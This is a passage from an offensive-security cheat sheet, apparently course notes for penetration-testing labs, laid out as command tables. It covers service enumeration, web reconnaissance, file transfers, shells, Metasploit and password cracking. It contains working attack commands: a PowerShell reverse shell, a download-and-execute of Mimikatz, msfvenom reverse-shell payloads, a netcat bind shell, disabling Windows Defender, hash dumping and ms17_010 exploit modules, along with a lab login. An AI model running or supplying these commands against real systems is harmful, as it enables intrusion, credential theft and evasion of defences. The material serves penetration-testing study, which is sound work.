<td><code>snmpwalk -v2c -c &lt;community string&gt; &lt;FQDN/IP&gt;</code></td>
<td>Querying OIDs using snmpwalk.</td>
</tr>
<tr class="even">
<td><code>onesixtyone -c community-strings.list &lt;FQDN/IP&gt;</code></td>
<td>Bruteforcing community strings of the SNMP service.</td>
</tr>
<tr class="odd">
<td><code>braa &lt;community string&gt;@&lt;FQDN/IP&gt;:.1.*</code></td>
<td>Bruteforcing SNMP service OIDs.</td>
</tr>
</tbody>
</table>
<h5 id="mysql">MySQL</h5>
<table>
<colgroup>
<col style="width: 50%" />
<col style="width: 50%" />
</colgroup>
<thead>
<tr class="header">
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>mysql -u &lt;user&gt; -p&lt;password&gt; &lt;FQDN/IP&gt;</code></td>
<td>Login to the MySQL server.</td>
</tr>
</tbody>
</table>
<h5 id="mssql">MSSQL</h5>
<table>
<colgroup>
<col style="width: 50%" />
<col style="width: 50%" />
</colgroup>
<thead>
<tr class="header">
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>mssqlclient.py &lt;user&gt;@&lt;FQDN/IP&gt; -windows-auth</code></td>
<td>Log in to the MSSQL server using Windows authentication.</td>
</tr>
</tbody>
</table>
<h5 id="ipmi">IPMI</h5>
<table>
<colgroup>
<col style="width: 50%" />
<col style="width: 50%" />
</colgroup>
<thead>
<tr class="header">
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>msf6 auxiliary(scanner/ipmi/ipmi_version)</code></td>
<td>IPMI version detection.</td>
</tr>
<tr class="even">
<td><code>msf6 auxiliary(scanner/ipmi/ipmi_dumphashes)</code></td>
<td>Dump IPMI hashes.</td>
</tr>
</tbody>
</table>
<h5 id="linux-remote-management">Linux Remote Management</h5>
<table>
<colgroup>
<col style="width: 50%" />
<col style="width: 50%" />
</colgroup>
<thead>
<tr class="header">
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>ssh-audit.py &lt;FQDN/IP&gt;</code></td>
<td>Remote security audit against the target SSH service.</td>
</tr>
<tr class="even">
<td><code>ssh &lt;user&gt;@&lt;FQDN/IP&gt;</code></td>
<td>Log in to the SSH server using the SSH client.</td>
</tr>
<tr class="odd">
<td><code>ssh -i private.key &lt;user&gt;@&lt;FQDN/IP&gt;</code></td>
<td>Log in to the SSH server using private key.</td>
</tr>
<tr class="even">
<td><code>ssh &lt;user&gt;@&lt;FQDN/IP&gt; -o PreferredAuthentications=password</code></td>
<td>Enforce password-based authentication.</td>
</tr>
</tbody>
</table>
<h5 id="windows-remote-management">Windows Remote Management</h5>
<table>
<colgroup>
<col style="width: 50%" />
<col style="width: 50%" />
</colgroup>
<thead>
<tr class="header">
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>rdp-sec-check.pl &lt;FQDN/IP&gt;</code></td>
<td>Check the security settings of the RDP service.</td>
</tr>
<tr class="even">
<td><code>xfreerdp /u:&lt;user&gt; /p:"&lt;password&gt;" /v:&lt;FQDN/IP&gt;</code></td>
<td>Log in to the RDP server from Linux.</td>
</tr>
<tr class="odd">
<td><code>evil-winrm -i &lt;FQDN/IP&gt; -u &lt;user&gt; -p &lt;password&gt;</code></td>
<td>Log in to the WinRM server.</td>
</tr>
<tr class="even">
<td><code>wmiexec.py &lt;user&gt;:"&lt;password&gt;"@&lt;FQDN/IP&gt; "&lt;system command&gt;"</code></td>
<td>Execute command using the WMI service.</td>
</tr>
</tbody>
</table>
<p><a id="5-information-gathering---web-edition"></a> ### 5. Information
Gathering - Web Edition</p>
<h4 id="whois">WHOIS</h4>
<table>
<colgroup>
<col style="width: 50%" />
<col style="width: 50%" />
</colgroup>
<thead>
<tr class="header">
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>export TARGET="domain.tld"</code></td>
<td>Assign target to an environment variable.</td>
</tr>
<tr class="even">
<td><code>whois $TARGET</code></td>
<td>WHOIS lookup for the target.</td>
</tr>
</tbody>
</table>
<h4 id="dns-enumeration">DNS Enumeration</h4>
<table>
<colgroup>
<col style="width: 50%" />
<col style="width: 50%" />
</colgroup>
<thead>
<tr class="header">
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>nslookup $TARGET</code></td>
<td>Identify the <code>A</code> record for the target domain.</td>
</tr>
<tr class="even">
<td><code>nslookup -query=A $TARGET</code></td>
<td>Identify the <code>A</code> record for the target domain.</td>
</tr>
<tr class="odd">
<td><code>dig $TARGET @&lt;nameserver/IP&gt;</code></td>
<td>Identify the <code>A</code> record for the target domain.</td>
</tr>
<tr class="even">
<td><code>dig a $TARGET @&lt;nameserver/IP&gt;</code></td>
<td>Identify the <code>A</code> record for the target domain.</td>
</tr>
<tr class="odd">
<td><code>nslookup -query=PTR &lt;IP&gt;</code></td>
<td>Identify the <code>PTR</code> record for the target IP address.</td>
</tr>
<tr class="even">
<td><code>dig -x &lt;IP&gt; @&lt;nameserver/IP&gt;</code></td>
<td>Identify the <code>PTR</code> record for the target IP address.</td>
</tr>
<tr class="odd">
<td><code>nslookup -query=ANY $TARGET</code></td>
<td>Identify <code>ANY</code> records for the target domain.</td>
</tr>
<tr class="even">
<td><code>dig any $TARGET @&lt;nameserver/IP&gt;</code></td>
<td>Identify <code>ANY</code> records for the target domain.</td>
</tr>
<tr class="odd">
<td><code>nslookup -query=TXT $TARGET</code></td>
<td>Identify the <code>TXT</code> records for the target domain.</td>
</tr>
<tr class="even">
<td><code>dig txt $TARGET @&lt;nameserver/IP&gt;</code></td>
<td>Identify the <code>TXT</code> records for the target domain.</td>
</tr>
<tr class="odd">
<td><code>nslookup -query=MX $TARGET</code></td>
<td>Identify the <code>MX</code> records for the target domain.</td>
</tr>
<tr class="even">
<td><code>dig mx $TARGET @&lt;nameserver/IP&gt;</code></td>
<td>Identify the <code>MX</code> records for the target domain.</td>
</tr>
</tbody>
</table>
<h4 id="passive-subdomain-enumeration">Passive Subdomain
Enumeration</h4>
<table>
<colgroup>
<col style="width: 50%" />
<col style="width: 50%" />
</colgroup>
<thead>
<tr class="header">
<th><strong>Resource/Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>VirusTotal</code></td>
<td><a
href="https://www.virustotal.com/gui/home/url">https://www.virustotal.com/gui/home/url</a></td>
</tr>
<tr class="even">
<td><code>Censys</code></td>
<td><a href="https://censys.io/">https://censys.io/</a></td>
</tr>
<tr class="odd">
<td><code>Crt.sh</code></td>
<td><a href="https://crt.sh/">https://crt.sh/</a></td>
</tr>
<tr class="even">
<td><code>curl -s https://sonar.omnisint.io/subdomains/{domain} \| jq -r '.[]' \| sort -u</code></td>
<td>All subdomains for a given domain.</td>
</tr>
<tr class="odd">
<td><code>curl -s https://sonar.omnisint.io/tlds/{domain} \| jq -r '.[]' \| sort -u</code></td>
<td>All TLDs found for a given domain.</td>
</tr>
<tr class="even">
<td><code>curl -s https://sonar.omnisint.io/all/{domain} \| jq -r '.[]' \| sort -u</code></td>
<td>All results across all TLDs for a given domain.</td>
</tr>
<tr class="odd">
<td><code>curl -s https://sonar.omnisint.io/reverse/{ip} \| jq -r '.[]' \| sort -u</code></td>
<td>Reverse DNS lookup on IP address.</td>
</tr>
<tr class="even">
<td><code>curl -s https://sonar.omnisint.io/reverse/{ip}/{mask} \| jq -r '.[]' \| sort -u</code></td>
<td>Reverse DNS lookup of a CIDR range.</td>
</tr>
<tr class="odd">
<td><code>curl -s "https://crt.sh/?q=${TARGET}&amp;output=json" \| jq -r '.[] \| "\(.name_value)\n\(.common_name)"' \| sort -u</code></td>
<td>Certificate Transparency.</td>
</tr>
<tr class="even">
<td><code>cat sources.txt \| while read source; do theHarvester -d "${TARGET}" -b $source -f "${source}-${TARGET}";done</code></td>
<td>Searching for subdomains and other information on the sources
provided in the source.txt list.</td>
</tr>
</tbody>
</table>
<h5 id="sources.txt">Sources.txt</h5>
<div class="sourceCode" id="cb1"><pre
class="sourceCode txt"><code class="sourceCode default"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a>baidu</span>
<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a>bufferoverun</span>
<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a>crtsh</span>
<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a>hackertarget</span>
<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a>otx</span>
<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a>projecdiscovery</span>
<span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a>rapiddns</span>
<span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a>sublist3r</span>
<span id="cb1-9"><a href="#cb1-9" aria-hidden="true" tabindex="-1"></a>threatcrowd</span>
<span id="cb1-10"><a href="#cb1-10" aria-hidden="true" tabindex="-1"></a>trello</span>
<span id="cb1-11"><a href="#cb1-11" aria-hidden="true" tabindex="-1"></a>urlscan</span>
<span id="cb1-12"><a href="#cb1-12" aria-hidden="true" tabindex="-1"></a>vhost</span>
<span id="cb1-13"><a href="#cb1-13" aria-hidden="true" tabindex="-1"></a>virustotal</span>
<span id="cb1-14"><a href="#cb1-14" aria-hidden="true" tabindex="-1"></a>zoomeye</span></code></pre></div>
<h4 id="passive-infrastructure-identification">Passive Infrastructure
Identification</h4>
<table>
<colgroup>
<col style="width: 50%" />
<col style="width: 50%" />
</colgroup>
<thead>
<tr class="header">
<th><strong>Resource/Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>Netcraft</code></td>
<td><a
href="https://www.netcraft.com/">https://www.netcraft.com/</a></td>
</tr>
<tr class="even">
<td><code>WayBackMachine</code></td>
<td><a href="http://web.archive.org/">http://web.archive.org/</a></td>
</tr>
<tr class="odd">
<td><code>WayBackURLs</code></td>
<td><a
href="https://github.com/tomnomnom/waybackurls">https://github.com/tomnomnom/waybackurls</a></td>
</tr>
<tr class="even">
<td><code>waybackurls -dates https://$TARGET &gt; waybackurls.txt</code></td>
<td>Crawling URLs from a domain with the date it was obtained.</td>
</tr>
</tbody>
</table>
<h4 id="active-infrastructure-identification">Active Infrastructure
Identification</h4>
<table>
<colgroup>
<col style="width: 50%" />
<col style="width: 50%" />
</colgroup>
<thead>
<tr class="header">
<th><strong>Resource/Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>curl -I "http://${TARGET}"</code></td>
<td>Display HTTP headers of the target webserver.</td>
</tr>
<tr class="even">
<td><code>whatweb -a https://www.facebook.com -v</code></td>
<td>Technology identification.</td>
</tr>
<tr class="odd">
<td><code>Wappalyzer</code></td>
<td><a
href="https://www.wappalyzer.com/">https://www.wappalyzer.com/</a></td>
</tr>
<tr class="even">
<td><code>wafw00f -v https://$TARGET</code></td>
<td>WAF Fingerprinting.</td>
</tr>
<tr class="odd">
<td><code>Aquatone</code></td>
<td><a
href="https://github.com/michenriksen/aquatone">https://github.com/michenriksen/aquatone</a></td>
</tr>
<tr class="even">
<td><code>cat subdomain.list \| aquatone -out ./aquatone -screenshot-timeout 1000</code></td>
<td>Makes screenshots of all subdomains in the subdomain.list.</td>
</tr>
</tbody>
</table>
<h4 id="active-subdomain-enumeration">Active Subdomain Enumeration</h4>
<table>
<colgroup>
<col style="width: 50%" />
<col style="width: 50%" />
</colgroup>
<thead>
<tr class="header">
<th><strong>Resource/Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>HackerTarget</code></td>
<td><a
href="https://hackertarget.com/zone-transfer/">https://hackertarget.com/zone-transfer/</a></td>
</tr>
<tr class="even">
<td><code>SecLists</code></td>
<td><a
href="https://github.com/danielmiessler/SecLists">https://github.com/danielmiessler/SecLists</a></td>
</tr>
<tr class="odd">
<td><code>nslookup -type=any -query=AXFR $TARGET nameserver.target.domain</code></td>
<td>Zone Transfer using Nslookup against the target domain and its
nameserver.</td>
</tr>
<tr class="even">
<td><code>gobuster dns -q -r "${NS}" -d "${TARGET}" -w "${WORDLIST}" -p ./patterns.txt -o "gobuster_${TARGET}.txt"</code></td>
<td>Bruteforcing subdomains.</td>
</tr>
</tbody>
</table>
<h4 id="virtual-hosts">Virtual Hosts</h4>
<table>
<colgroup>
<col style="width: 50%" />
<col style="width: 50%" />
</colgroup>
<thead>
<tr class="header">
<th><strong>Resource/Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>curl -s http://192.168.10.10 -H "Host: randomtarget.com"</code></td>
<td>Changing the HOST HTTP header to request a specific domain.</td>
</tr>
<tr class="even">
<td><code>cat ./vhosts.list \| while read vhost;do echo "\n********\nFUZZING: ${vhost}\n********";curl -s -I http://&lt;IP address&gt; -H "HOST: ${vhost}.target.domain" \| grep "Content-Length: ";done</code></td>
<td>Bruteforcing for possible virtual hosts on the target domain.</td>
</tr>
<tr class="odd">
<td><code>ffuf -w ./vhosts -u http://&lt;IP address&gt; -H "HOST: FUZZ.target.domain" -fs 612</code></td>
<td>Bruteforcing for possible virtual hosts on the target domain using
<code>ffuf</code>.</td>
</tr>
</tbody>
</table>
<h4 id="crawling">Crawling</h4>
<table>
<colgroup>
<col style="width: 50%" />
<col style="width: 50%" />
</colgroup>
<thead>
<tr class="header">
<th><strong>Resource/Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>ZAP</code></td>
<td><a href="https://www.zaproxy.org/">https://www.zaproxy.org/</a></td>
</tr>
<tr class="even">
<td><code>ffuf -recursion -recursion-depth 1 -u http://192.168.10.10/FUZZ -w /opt/useful/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt</code></td>
<td>Discovering files and folders that cannot be spotted by browsing the
website.</td>
</tr>
<tr class="odd">
<td><code>ffuf -w ./folders.txt:FOLDERS,./wordlist.txt:WORDLIST,./extensions.txt:EXTENSIONS -u http://www.target.domain/FOLDERS/WORDLISTEXTENSIONS</code></td>
<td>Mutated bruteforcing against the target web server.</td>
</tr>
</tbody>
</table>
<p><a id="6-vulnerability-assessment"></a> ### 6. Vulnerability
Assessment N#A</p>
<p><a id="7-file-transfers"></a> ### 7. File Transfers</p>
<table>
<colgroup>
<col style="width: 42%" />
<col style="width: 57%" />
</colgroup>
<thead>
<tr class="header">
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>Invoke-WebRequest https://&lt;snip&gt;/PowerView.ps1 -OutFile PowerView.ps1</code></td>
<td>Download a file with PowerShell</td>
</tr>
<tr class="even">
<td><code>IEX (New-Object Net.WebClient).DownloadString('https://&lt;snip&gt;/Invoke-Mimikatz.ps1')</code></td>
<td>Execute a file in memory using PowerShell</td>
</tr>
<tr class="odd">
<td><code>Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64</code></td>
<td>Upload a file with PowerShell</td>
</tr>
<tr class="even">
<td><code>bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe</code></td>
<td>Download a file using Bitsadmin</td>
</tr>
<tr class="odd">
<td><code>certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe</code></td>
<td>Download a file using Certutil</td>
</tr>
<tr class="even">
<td><code>wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh</code></td>
<td>Download a file using Wget</td>
</tr>
<tr class="odd">
<td><code>curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh</code></td>
<td>Download a file using cURL</td>
</tr>
<tr class="even">
<td><code>php -r '$file = file_get_contents("https://&lt;snip&gt;/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'</code></td>
<td>Download a file using PHP</td>
</tr>
<tr class="odd">
<td><code>scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip</code></td>
<td>Upload a file using SCP</td>
</tr>
<tr class="even">
<td><code>scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe</code></td>
<td>Download a file using SCP</td>
</tr>
<tr class="odd">
<td><code>Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"</code></td>
<td>Invoke-WebRequest using a Chrome User Agent</td>
</tr>
</tbody>
</table>
<p><a id="8-shells--payloads"></a> ### 8. Shells &amp; Payloads</p>
<table>
<colgroup>
<col style="width: 50%" />
<col style="width: 50%" />
</colgroup>
<thead>
<tr class="header">
<th><strong>Commands</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>xfreerdp /v:10.129.x.x /u:htb-student /p:HTB_@cademy_stdnt!</code></td>
<td>CLI-based tool used to connect to a Windows target using the Remote
Desktop Protocol</td>
</tr>
<tr class="even">
<td><code>env</code></td>
<td>Works with many different command language interpreters to discover
the environmental variables of a system. This is a great way to find out
which shell language is in use</td>
</tr>
<tr class="odd">
<td><code>sudo nc -lvnp &lt;port #&gt;</code></td>
<td>Starts a <code>netcat</code> listener on a specified port</td>
</tr>
<tr class="even">
<td><code>nc -nv &lt;ip address of computer with listener started&gt;&lt;port being listened on&gt;</code></td>
<td>Connects to a netcat listener at the specified IP address and
port</td>
</tr>
<tr class="odd">
<td><code>rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f \| /bin/bash -i 2&gt;&amp;1 \| nc -l 10.129.41.200 7777 &gt; /tmp/f</code></td>
<td>Uses netcat to bind a shell (<code>/bin/bash</code>) the specified
IP address and port. This allows for a shell session to be served
remotely to anyone connecting to the computer this command has been
issued on</td>
</tr>
<tr class="even">
<td><code>powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535\|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 \| Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"</code></td>
<td><code>Powershell</code> one-liner used to connect back to a listener
that has been started on an attack box</td>
</tr>
<tr class="odd">
<td><code>Set-MpPreference -DisableRealtimeMonitoring $true</code></td>
<td>Powershell command using to disable real time monitoring in
<code>Windows Defender</code></td>
</tr>
<tr class="even">
<td><code>use exploit/windows/smb/psexec</code></td>
<td>Metasploit exploit module that can be used on vulnerable Windows
system to establish a shell session utilizing <code>smb</code> &amp;
<code>psexec</code></td>
</tr>
<tr class="odd">
<td><code>shell</code></td>
<td>Command used in a meterpreter shell session to drop into a
<code>system shell</code></td>
</tr>
<tr class="even">
<td><code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf &gt; nameoffile.elf</code></td>
<td><code>MSFvenom</code> command used to generate a linux-based reverse
shell <code>stageless payload</code></td>
</tr>
<tr class="odd">
<td><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe &gt; nameoffile.exe</code></td>
<td>MSFvenom command used to generate a Windows-based reverse shell
stageless payload</td>
</tr>
<tr class="even">
<td><code>msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f macho &gt; nameoffile.macho</code></td>
<td>MSFvenom command used to generate a MacOS-based reverse shell
payload</td>
</tr>
<tr class="odd">
<td><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.113 LPORT=443 -f asp &gt; nameoffile.asp</code></td>
<td>MSFvenom command used to generate a ASP web reverse shell
payload</td>
</tr>
<tr class="even">
<td><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f raw &gt; nameoffile.jsp</code></td>
<td>MSFvenom command used to generate a JSP web reverse shell
payload</td>
</tr>
<tr class="odd">
<td><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f war &gt; nameoffile.war</code></td>
<td>MSFvenom command used to generate a WAR java/jsp compatible web
reverse shell payload</td>
</tr>
<tr class="even">
<td><code>use auxiliary/scanner/smb/smb_ms17_010</code></td>
<td>Metasploit exploit module used to check if a host is vulnerable to
<code>ms17_010</code></td>
</tr>
<tr class="odd">
<td><code>use exploit/windows/smb/ms17_010_psexec</code></td>
<td>Metasploit exploit module used to gain a reverse shell session on a
Windows-based system that is vulnerable to ms17_010</td>
</tr>
<tr class="even">
<td><code>use exploit/linux/http/rconfig_vendors_auth_file_upload_rce</code></td>
<td>Metasploit exploit module that can be used to optain a reverse shell
on a vulnerable linux system hosting <code>rConfig 3.9.6</code></td>
</tr>
<tr class="odd">
<td><code>python -c 'import pty; pty.spawn("/bin/sh")'</code></td>
<td>Python command used to spawn an <code>interactive shell</code> on a
linux-based system</td>
</tr>
<tr class="even">
<td><code>/bin/sh -i</code></td>
<td>Spawns an interactive shell on a linux-based system</td>
</tr>
<tr class="odd">
<td><code>perl —e 'exec "/bin/sh";'</code></td>
<td>Uses <code>perl</code> to spawn an interactive shell on a
linux-based system</td>
</tr>
<tr class="even">
<td><code>ruby: exec "/bin/sh"</code></td>
<td>Uses <code>ruby</code> to spawn an interactive shell on a
linux-based system</td>
</tr>
<tr class="odd">
<td><code>Lua: os.execute('/bin/sh')</code></td>
<td>Uses <code>Lua</code> to spawn an interactive shell on a linux-based
system</td>
</tr>
<tr class="even">
<td><code>awk 'BEGIN {system("/bin/sh")}'</code></td>
<td>Uses <code>awk</code> command to spawn an interactive shell on a
linux-based system</td>
</tr>
<tr class="odd">
<td><code>find / -name nameoffile 'exec /bin/awk 'BEGIN {system("/bin/sh")}' \;</code></td>
<td>Uses <code>find</code> command to spawn an interactive shell on a
linux-based system</td>
</tr>
<tr class="even">
<td><code>find . -exec /bin/sh \; -quit</code></td>
<td>An alternative way to use the <code>find</code> command to spawn an
interactive shell on a linux-based system</td>
</tr>
<tr class="odd">
<td><code>vim -c ':!/bin/sh'</code></td>
<td>Uses the text-editor <code>VIM</code> to spawn an interactive shell.
Can be used to escape “jail-shells”</td>
</tr>
<tr class="even">
<td><code>ls -la &lt;path/to/fileorbinary&gt;</code></td>
<td>Used to <code>list</code> files &amp; directories on a linux-based
system and shows the permission for each file in the chosen directory.
Can be used to look for binaries that we have permission to execute</td>
</tr>
<tr class="odd">
<td><code>sudo -l</code></td>
<td>Displays the commands that the currently logged on user can run as
<code>sudo</code></td>
</tr>
<tr class="even">
<td><code>/usr/share/webshells/laudanum</code></td>
<td>Location of <code>laudanum webshells</code> on ParrotOS and
Pwnbox</td>
</tr>
<tr class="odd">
<td><code>/usr/share/nishang/Antak-WebShell</code></td>
<td>Location of <code>Antak-Webshell</code> on Parrot OS and Pwnbox</td>
</tr>
</tbody>
</table>
<p><a id="9-using-the-metasploit-framework"></a> ### 9. Using the
Metasploit Framework</p>
<h4 id="msfconsole-commands">MSFconsole Commands</h4>
<table>
<colgroup>
<col style="width: 21%" />
<col style="width: 78%" />
</colgroup>
<thead>
<tr class="header">
<th style="text-align: left;"><strong>Command</strong></th>
<th style="text-align: left;"><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: left;"><code>show exploits</code></td>
<td style="text-align: left;">Show all exploits within the
Framework.</td>
</tr>
<tr class="even">
<td style="text-align: left;"><code>show payloads</code></td>
<td style="text-align: left;">Show all payloads within the
Framework.</td>
</tr>
<tr class="odd">
<td style="text-align: left;"><code>show auxiliary</code></td>
<td style="text-align: left;">Show all auxiliary modules within the
Framework.</td>
</tr>
<tr class="even">
<td style="text-align: left;"><code>search &lt;name&gt;</code></td>
<td style="text-align: left;">Search for exploits or modules within the
Framework.</td>
</tr>
<tr class="odd">
<td style="text-align: left;"><code>info</code></td>
<td style="text-align: left;">Load information about a specific exploit
or module.</td>
</tr>
<tr class="even">
<td style="text-align: left;"><code>use &lt;name&gt;</code></td>
<td style="text-align: left;">Load an exploit or module (example: use
windows/smb/psexec).</td>
</tr>
<tr class="odd">
<td style="text-align: left;"><code>use &lt;number&gt;</code></td>
<td style="text-align: left;">Load an exploit by using the index number
displayed after the search command.</td>
</tr>
<tr class="even">
<td style="text-align: left;"><code>LHOST</code></td>
<td style="text-align: left;">Your local host’s IP address reachable by
the target, often the public IP address when not on a local network.
Typically used for reverse shells.</td>
</tr>
<tr class="odd">
<td style="text-align: left;"><code>RHOST</code></td>
<td style="text-align: left;">The remote host or the target. set
function Set a specific value (for example, LHOST or RHOST).</td>
</tr>
<tr class="even">
<td style="text-align: left;"><code>setg &lt;function&gt;</code></td>
<td style="text-align: left;">Set a specific value globally (for
example, LHOST or RHOST).</td>
</tr>
<tr class="odd">
<td style="text-align: left;"><code>show options</code></td>
<td style="text-align: left;">Show the options available for a module or
exploit.</td>
</tr>
<tr class="even">
<td style="text-align: left;"><code>show targets</code></td>
<td style="text-align: left;">Show the platforms supported by the
exploit.</td>
</tr>
<tr class="odd">
<td
style="text-align: left;"><code>set target &lt;number&gt;</code></td>
<td style="text-align: left;">Specify a specific target index if you
know the OS and service pack.</td>
</tr>
<tr class="even">
<td
style="text-align: left;"><code>set payload &lt;payload&gt;</code></td>
<td style="text-align: left;">Specify the payload to use.</td>
</tr>
<tr class="odd">
<td
style="text-align: left;"><code>set payload &lt;number&gt;</code></td>
<td style="text-align: left;">Specify the payload index number to use
after the show payloads command.</td>
</tr>
<tr class="even">
<td style="text-align: left;"><code>show advanced</code></td>
<td style="text-align: left;">Show advanced options.</td>
</tr>
<tr class="odd">
<td
style="text-align: left;"><code>set autorunscript migrate -f</code></td>
<td style="text-align: left;">Automatically migrate to a separate
process upon exploit completion.</td>
</tr>
<tr class="even">
<td style="text-align: left;"><code>check</code></td>
<td style="text-align: left;">Determine whether a target is vulnerable
to an attack.</td>
</tr>
<tr class="odd">
<td style="text-align: left;"><code>exploit</code></td>
<td style="text-align: left;">Execute the module or exploit and attack
the target.</td>
</tr>
<tr class="even">
<td style="text-align: left;"><code>exploit -j</code></td>
<td style="text-align: left;">Run the exploit under the context of the
job. (This will run the exploit in the background.)</td>
</tr>
<tr class="odd">
<td style="text-align: left;"><code>exploit -z</code></td>
<td style="text-align: left;">Do not interact with the session after
successful exploitation.</td>
</tr>
<tr class="even">
<td
style="text-align: left;"><code>exploit -e &lt;encoder&gt;</code></td>
<td style="text-align: left;">Specify the payload encoder to use
(example: exploit –e shikata_ga_nai).</td>
</tr>
<tr class="odd">
<td style="text-align: left;"><code>exploit -h</code></td>
<td style="text-align: left;">Display help for the exploit command.</td>
</tr>
<tr class="even">
<td style="text-align: left;"><code>sessions -l</code></td>
<td style="text-align: left;">List available sessions (used when
handling multiple shells).</td>
</tr>
<tr class="odd">
<td style="text-align: left;"><code>sessions -l -v</code></td>
<td style="text-align: left;">List all available sessions and show
verbose fields, such as which vulnerability was used when exploiting the
system.</td>
</tr>
<tr class="even">
<td
style="text-align: left;"><code>sessions -s &lt;script&gt;</code></td>
<td style="text-align: left;">Run a specific Meterpreter script on all
Meterpreter live sessions.</td>
</tr>
<tr class="odd">
<td style="text-align: left;"><code>sessions -K</code></td>
<td style="text-align: left;">Kill all live sessions.</td>
</tr>
<tr class="even">
<td style="text-align: left;"><code>sessions -c &lt;cmd&gt;</code></td>
<td style="text-align: left;">Execute a command on all live Meterpreter
sessions.</td>
</tr>
<tr class="odd">
<td
style="text-align: left;"><code>sessions -u &lt;sessionID&gt;</code></td>
<td style="text-align: left;">Upgrade a normal Win32 shell to a
Meterpreter console.</td>
</tr>
<tr class="even">
<td style="text-align: left;"><code>db_create &lt;name&gt;</code></td>
<td style="text-align: left;">Create a database to use with
database-driven attacks (example: db_create autopwn).</td>
</tr>
<tr class="odd">
<td style="text-align: left;"><code>db_connect &lt;name&gt;</code></td>
<td style="text-align: left;">Create and connect to a database for
driven attacks (example: db_connect autopwn).</td>
</tr>
<tr class="even">
<td style="text-align: left;"><code>db_nmap</code></td>
<td style="text-align: left;">Use Nmap and place results in a database.
(Normal Nmap syntax is supported, such as –sT –v –P0.)</td>
</tr>
<tr class="odd">
<td style="text-align: left;"><code>db_destroy</code></td>
<td style="text-align: left;">Delete the current database.</td>
</tr>
<tr class="even">
<td
style="text-align: left;"><code>db_destroy  &lt;user:password@host:port/database&gt;</code></td>
<td style="text-align: left;">Delete database using advanced
options.</td>
</tr>
</tbody>
</table>
<p><a id="exploitation--lateral-movement"></a> ## Exploitation &amp;
Lateral Movement</p>
<p><a id="10-password-attacks"></a> ### 10. Password Attacks</p>
<h4 id="connecting-to-target">Connecting to Target</h4>
<table>
<colgroup>
<col style="width: 21%" />
<col style="width: 78%" />
</colgroup>
<thead>
<tr class="header">
<th style="text-align: left;"><strong>Command</strong></th>
<th style="text-align: left;"><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td
style="text-align: left;"><code>hashcat -m 1000 dumpedhashes.txt /usr/share/wordlists/rockyou.txt</code></td>
<td style="text-align: left;">Uses Hashcat to crack NTLM hashes using a
specified wordlist.</td>
</tr>
<tr class="even">
<td
